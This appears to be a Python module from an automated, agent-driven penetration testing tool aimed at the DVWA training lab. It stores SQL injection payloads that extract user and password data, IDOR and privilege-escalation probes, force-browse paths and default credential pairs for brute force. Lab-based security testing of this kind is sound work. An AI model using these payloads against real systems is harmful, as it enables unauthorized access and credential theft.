"""Payload library — per-vulnerability payload database and mutation engine."""

from dataclasses import dataclass, field


_SECURITY_LEVELS = {"low", "medium", "high"}


@dataclass(frozen=True)
class PayloadSet:
    """Immutable container for payloads associated with a single vulnerability class.

    Attributes:
        probe: Simple detection payloads used in Stage 1 of exploitation.
        exploit: Exploitation payloads used when a vulnerability is confirmed.
        bypass: Security-level–specific bypass payloads. Keyed by level name
            (``"low"``, ``"medium"``, ``"high"``).
    """

    probe: list[str] = field(default_factory=list)
    exploit: list[str] = field(default_factory=list)
    bypass: dict[str, list[str]] = field(default_factory=dict)


@dataclass(frozen=True)
class PayloadSeed:
    """Validated handwritten payload seed with reproducible provenance."""

    seed_id: str
    method: str
    security_level: str
    stage: str
    payload_or_logic: str
    target_param: str
    expected_signal: str
    source: str = "static_seed"


class PayloadLibrary:
    """Retrieve payloads by vulnerability class and security level."""

    _PAYLOAD_DB: dict[str, PayloadSet] = {
        "sqli_union": PayloadSet(
            probe=["1' ORDER BY 1-- -", "1' ORDER BY 2-- -", "1' UNION SELECT null,null-- -"],
            exploit=["1' UNION SELECT user,password FROM users-- -"],
            bypass={
                "medium": ["1 UNION SELECT user,password FROM users#"],
                "high": ["1' UNION SELECT user,password FROM users LIMIT 1-- -"],
            },
        ),
        "sqli_error": PayloadSet(
            probe=["1'", "1''", "1\\'"],
            exploit=["1' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
                     "1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users-- -"],
            bypass={
                "medium": ["1 AND extractvalue(1,concat(0x7e,(SELECT database())))#"],
                "high": ["1' AND 1=0 UNION SELECT null,concat(user,0x3a,password) FROM users LIMIT 1-- -"],
            },
        ),
        "sqli_boolean_blind": PayloadSet(
            probe=["1' AND 1=1-- -", "1' AND 1=2-- -"],
            exploit=["1' AND ASCII(SUBSTR(database(),1,1))>77-- -",
                     "1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77-- -"],
            bypass={
                "medium": ["1 AND ASCII(SUBSTR(database(),1,1))>77#"],
                "high": ["1'/**/AND/**/ASCII(SUBSTR(database(),1,1))>77-- -"],
            },
        ),
        "sqli_time_blind": PayloadSet(
            probe=["1' AND SLEEP(3)-- -"],
            exploit=[
                "1' AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)-- -",
                "1' AND IF(ASCII(SUBSTR(database(),1,1))>100,SLEEP(3),0)-- -",
            ],
            bypass={
                "medium": ["1 AND SLEEP(3)#"],
                "high": ["1'/**/AND/**/SLEEP(3)-- -"],
            },
        ),
        "ac_idor": PayloadSet(
            probe=["1", "2", "3"],
            exploit=["4", "5", "6"],
            bypass={
                "medium": ["7", "8"],
                "high": ["100", "200"],
            },
        ),
        "ac_vertical_escalation": PayloadSet(
            probe=["2", "3"],
            exploit=["1"],
            bypass={
                "medium": ["1"],
                "high": ["1"],
            },
        ),
        "ac_force_browse": PayloadSet(
            probe=["setup.php", "phpinfo.php"],
            exploit=["vulnerabilities/view_source.php", "security.php"],
            bypass={
                "medium": ["setup.php"],
                "high": ["setup.php"],
            },
        ),
        # NOTE: bf_dictionary, bf_spray, and ac_force_browse have identical
        # bypass payloads across all security levels because DVWA does not
        # implement encoding-based bypasses for brute-force or force-browse.
        # High-level CAPTCHA is a documented scope boundary (AGENTS.md).
        "bf_dictionary": PayloadSet(
            probe=["rate_test:test", "probe:probe"],
            exploit=["admin:password", "gordonb:abc123", "pablo:letmein", "smithy:password"],
            bypass={
                "medium": ["admin:password"],
                "high": ["admin:password"],
            },
        ),
        "bf_spray": PayloadSet(
            probe=["rate_test:test", "probe:probe"],
            exploit=["admin:password", "gordonb:abc123", "pablo:letmein", "1337:charley"],
            bypass={
                "medium": ["admin:password"],
                "high": ["admin:password"],
            },
        ),
    }

    def get(self, vuln_class: str, security_level: str = "low") -> PayloadSet:
        """Return a defensive copy of payloads for ``vuln_class``.

        Unknown classes resolve to an empty ``PayloadSet``.
        Unknown security levels are normalized to ``"low"``.
        """
        payload_set = self._PAYLOAD_DB.get(vuln_class)
        if payload_set is None:
            return PayloadSet()

        normalized_level = security_level.lower().strip()
        if normalized_level not in _SECURITY_LEVELS:
            normalized_level = "low"

        bypass_copy = {
            level: list(values)
            for level, values in payload_set.bypass.items()
            if isinstance(level, str)
        }
        # Ensure the requested level key always exists for simple consumers.
        bypass_copy.setdefault(normalized_level, list(payload_set.bypass.get(normalized_level, [])))

        return PayloadSet(
            probe=list(payload_set.probe),
            exploit=list(payload_set.exploit),
            bypass=bypass_copy,
        )

    def load_seed_candidates(self, method: str, security_level: str = "low") -> list[dict]:
        """Return static payloads as validator-ready candidate dictionaries."""
        normalized_level = security_level.lower().strip()
        if normalized_level not in _SECURITY_LEVELS:
            normalized_level = "low"
        payload_set = self.get(method, normalized_level)
        rows: list[tuple[str, str]] = []
        rows.extend(("probe", payload) for payload in payload_set.probe)
        rows.extend(("exploit", payload) for payload in payload_set.exploit)
        rows.extend(("bypass", payload) for payload in payload_set.bypass.get(normalized_level, []))

        candidates: list[dict] = []
        seen_payloads: set[str] = set()
        for stage, payload in rows:
            # Some DVWA levels intentionally reuse an exploit seed as a
            # bypass seed. Deduplicate at the source so the validator does
            # not report a handwritten candidate as a duplicate rejection.
            if payload in seen_payloads:
                continue
            seen_payloads.add(payload)
            index = len(candidates)
            seed_id = f"{method}_{normalized_level}_{stage}_{index}"
            candidates.append({
                "candidate_id": seed_id,
                "source_seed_id": seed_id,
                "source": "static_seed",
                "method": method,
                "security_level": normalized_level,
                "stage": stage,
                "mutation_type": "none",
                "payload_or_logic": payload,
                "target_param": target_param_for_method(method),
                "expected_signal": expected_signal_for_method(method),
                "rationale": "validated handwritten seed",
            })
        return candidates

    @staticmethod
    def record_tried(state: dict, agent_id: str, payload: str) -> dict:
        """Produce a partial state update recording *payload* as tried for *agent_id*.

        This is a pure function that returns a new dict without mutating *state*.
        The returned dict can be merged into LangGraph state via the appropriate
        reducer.

        Args:
            state: Current exploitation state (read-only).
            agent_id: Agent ID (e.g. ``"sqli_union"``).
            payload: Payload string that was attempted.

        Returns:
            Partial state update: ``{"tried_payloads": {agent_id: [...tried + payload]}}``
        """
        tried = dict(state.get("tried_payloads", {}))
        agent_tried = list(tried.get(agent_id, []))
        if payload not in agent_tried:
            agent_tried.append(payload)
        tried[agent_id] = agent_tried
        return {"tried_payloads": tried}

    @staticmethod
    def record_bypass(
        state: dict, technique: str, blocked_pattern: str | None = None
    ) -> dict:
        """Produce a partial state update recording a successful bypass technique.

        This is a pure function that returns a new dict without mutating *state*.

        Args:
            state: Current exploitation state (read-only).
            technique: Bypass technique that succeeded (e.g. ``"double_encode"``).
            blocked_pattern: The pattern that was bypassed, if known.

        Returns:
            Partial state update with ``"successful_bypasses"`` and optionally
            ``"blocked_patterns"``.
        """
        existing = list(state.get("successful_bypasses", []))
        additions = [] if technique in existing else [technique]

        update: dict = {"successful_bypasses": additions}
        if blocked_pattern:
            blocked_existing = list(state.get("blocked_patterns", []))
            update["blocked_patterns"] = [] if blocked_pattern in blocked_existing else [blocked_pattern]
        return update


def target_param_for_method(method: str) -> str:
    """Handles target param for method behavior for this module.

    Args:
        method: Value used by this function."""
    if method.startswith("sqli_"):
        return "id"
    if method in {"ac_idor", "ac_vertical_escalation"}:
        return "userId"
    if method == "ac_force_browse":
        return "path"
    if method.startswith("bf_"):
        return "credential_pair"
    return "payload"


def expected_signal_for_method(method: str) -> str:
    """Handles expected signal for method behavior for this module.

    Args:
        method: Value used by this function."""
    signals = {
        "sqli_union": "data_extraction_evidence",
        "sqli_error": "database_error_leakage",
        "sqli_boolean_blind": "true_false_response_delta",
        "sqli_time_blind": "measurable_delay",
        "ac_idor": "unauthorized_object_access",
        "ac_vertical_escalation": "privileged_action_accessible",
        "ac_force_browse": "restricted_endpoint_accessible",
        "bf_dictionary": "valid_login",
        "bf_spray": "valid_login",
    }
    return signals.get(method, "expected_signal")
